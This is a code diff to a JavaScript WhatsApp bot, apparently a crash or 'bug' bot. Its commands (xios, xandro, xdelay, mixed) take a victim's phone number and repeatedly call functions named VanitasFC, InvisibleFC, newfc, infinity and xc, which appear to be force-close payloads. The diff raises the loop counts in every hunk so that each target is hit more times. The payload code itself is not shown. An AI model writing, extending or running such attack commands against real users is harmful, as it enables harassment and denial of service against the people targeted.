@@ -709,7 +709,7 @@ break
                     } else {
                     if (!q) return send("Usage: `xios 234xxx`");
                     const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
-                    for (let i = 0; i < 5; i++) {   
+                    for (let i = 0; i < 10; i++) {   
                         await xc(target);
                         await xc(target);
                         await xc(target);
@@ -730,7 +730,7 @@ break
                     if (!q) return send("Usage: `xandro 234xxx`");
                     const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
                     try {
-                    for (let i = 0; i < 15; i++) {
+                    for (let i = 0; i < 20; i++) {
                         await VanitasFC(target);
                         await infinity(target);
                         await InvisibleFC(target);
@@ -791,7 +791,7 @@ break
                     } else {
             await conn.chatModify({ archive: true}, chat);
                     try {
-                    for (let i = 0; i < 15; i++) {
+                    for (let i = 0; i < 20; i++) {
                         await infinity(chat);
                         await VanitasFC(chat);
                         await infinity(chat);
@@ -831,7 +831,7 @@ break
                     if (!q) return send("Usage: `xdelay 234xxx`");
                     const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
                     try {
-                    for (let i = 0; i < 10; i++) {
+                    for (let i = 0; i < 15; i++) {
                         await newfc(target);
                         await InvisibleFC(target);
                     }
@@ -852,7 +852,7 @@ break
                     if (!q) return send("Usage: `mixed 234xxx`");
                     const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
                     try {
-                    for (let i = 0; i < 15; i++) {
+                    for (let i = 0; i < 20; i++) {
                         await xc(target);
                         await newfc(target);
                         await newfc(target);
